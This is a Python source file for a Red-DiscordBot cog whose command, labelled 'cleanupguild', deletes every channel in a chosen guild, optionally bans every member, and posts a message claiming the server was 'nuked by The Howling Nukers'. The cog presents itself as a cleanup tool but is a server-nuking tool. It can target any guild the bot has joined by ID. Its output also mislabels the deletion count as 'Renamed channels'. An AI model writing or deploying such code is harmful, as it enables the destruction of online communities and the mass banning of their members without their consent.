import discord
from redbot.core import commands

class CleanupGuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.guild_only()
    @commands.is_owner()
    async def cleanupguild(self, ctx, category_title: str = "General Category", channel_title: str = "general", guild_id: int = None, ban_users: bool = False):
        """
        Cleanup the specified guild or the current guild by:
        1. Removing all channels and categories
        2. Adding one category and channel with the specified names
        3. Sending a cleanup message in the new channel
        4. Banning all users (excluding bot) if 'ban_users' is True
        """
        if guild_id:
            guild = self.bot.get_guild(guild_id)
            if not guild:
                await ctx.send("Guild not found.")
                return
        else:
            guild = ctx.guild

        renamed_channels = 0
        banned_users = 0

        # Check permissions before taking action
        missing_perms = []
        if not ctx.me.guild_permissions.manage_channels:
            missing_perms.append("Manage Channels")
        if not ctx.me.guild_permissions.ban_members and ban_users:
            missing_perms.append("Ban Members")

        # Notify the user about missing permissions
        if missing_perms:
            missing_perms_message = f"The bot is missing the following permissions: {', '.join(missing_perms)}"
            warning_message = await ctx.send(missing_perms_message)
            await warning_message.add_reaction("✅")

            def check(reaction, user):
                return user == ctx.author and str(reaction.emoji) == "✅" and reaction.message.id == warning_message.id

            try:
                reaction, _ = await self.bot.wait_for("reaction_add", check=check, timeout=60.0)
                if "✅" in [str(reaction.emoji) for reaction in warning_message.reactions]:
                    # Bot owner has confirmed, continue with the actions
                    await warning_message.delete()
                else:
                    # Bot owner did not confirm, skip actions
                    await warning_message.delete()
                    await ctx.send("Bot owner did not confirm. Cleanup actions skipped.")
                    return
            except Exception:
                # Bot owner did not confirm within the timeout, skip actions
                await warning_message.delete()
                await ctx.send("Bot owner did not confirm within the timeout. Cleanup actions skipped.")
                return

        try:
            # Remove all channels and categories
            for channel in guild.channels:
                await channel.delete()
                renamed_channels += 1

            # Add one category with the specified name
            category = await guild.create_category(category_title)

            # Add one text channel inside the category
            channel = await guild.create_text_channel(channel_title, category=category)

            # Send a cleanup message in the new channel
            await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")

            # Ban all users (excluding bot) if 'ban_users' is True
            if ban_users:
                bot_user = guild.get_member(self.bot.user.id)
                for member in guild.members:
                    if member != bot_user:
                        try:
                            await member.ban(reason="CleanupGuild command")
                            banned_users += 1
                        except discord.errors.Forbidden:
                            pass  # Missing permissions, skip this user

            # Output message detailing the actions
            output_message = (
                f"Renamed channels: **{renamed_channels}**\n"
                f"Banned users: **{banned_users}**"
            )

            await ctx.send(output_message)
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

def setup(bot):
    bot.add_cog(CleanupGuild(bot))
